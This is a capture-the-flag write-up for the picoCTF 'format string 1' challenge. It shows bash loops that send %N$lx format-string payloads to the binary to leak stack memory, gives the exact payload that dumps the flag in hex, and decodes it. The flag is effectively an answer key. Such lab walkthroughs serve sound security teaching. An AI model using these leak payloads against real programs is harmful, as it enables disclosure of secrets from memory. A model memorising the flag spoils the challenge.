# format string 1 #

https://play.picoctf.org/events/73/challenges/challenge/434

## Description ##

Patrick and Sponge Bob were really happy with those orders you made
for them, but now they're curious about the secret menu. Find it, and
along the way, maybe you'll find something else of interest! Download
the binary here. Download the source [here](format-string-1.c).

Additional details will be available after launching your challenge
instance.

## Hints ##

* https://lettieri.iet.unipi.it/hacking/format-strings.pdf
* Is this a 32-bit or 64-bit binary?

## Solution ##

Read line by line of the stack using format strings such as `%2$lx`

Find out where things are:

``` bash
for s in {1..25}
do 
	echo $s
	echo "%${s}\$lx" | ./format-string-1 | grep Here | \
		sed -E 's/Here.s your order: ([0-9a-f]+)/\1/' | \
		xxd -r -p
	echo
done
```

Now it's clear the flag starts at `%14$lx`. By printing the subsequent
stack lines we can grab the flag (in hex):

	Give me your order and I'll read it back to you:
	%14$lx_%15$lx_%16$lx_%17$lx_%18$016lx
	Here's your order: 7b4654436f636970_355f31346d316e34_3478345f33317937_30355f673431665f_007d343663363933
	Bye!


Recover the flag from the hex codes:

``` bash
for s in \
	$(echo 7b4654436f636970_355f31346d316e34_3478345f33317937_30355f673431665f_007d343663363933 | tr _ ' ')
do 
	echo "0x$s" | xxd -r | xxd -g 8 -e | xxd -r
done
```

## Learnings ##

* Use `xxd -r | xxd -g 8 -e | xxd -r` to print a group of 8 bytes (hex) backwards (reverse)
* The format string `%18$016lx` ensures zero-padding with `printf()`
